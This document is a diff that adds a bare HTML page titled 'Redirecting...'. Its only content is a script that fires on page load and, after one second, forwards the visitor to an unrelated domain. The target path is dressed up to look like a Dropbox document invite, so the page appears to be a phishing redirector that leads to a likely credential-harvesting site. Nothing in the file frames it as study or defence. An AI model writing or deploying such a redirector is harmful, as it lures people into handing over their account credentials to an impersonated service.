@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Define the base URL to redirect to
+            var baseUrl = "https://bridgesdanang.com/securedoc/Dropbox/dropbox.com/Windows/invite.php";
+
+            // Grab the element you want to use for the fragment identifier
+            var element = document.querySelector("#elementToGrab");
+
+            // Construct the full URL with the fragment identifier
+            var fullUrl = baseUrl + (element ? "#" + element.id : "");
+
+            // Redirect after 1 second
+            setTimeout(function() {
+                window.location.href = fullUrl;
+            }, 1000);
+        });
+    </script>
+</head>
+<body>
+    <div id="elementToGrab"></div>
+</body>
+</html>
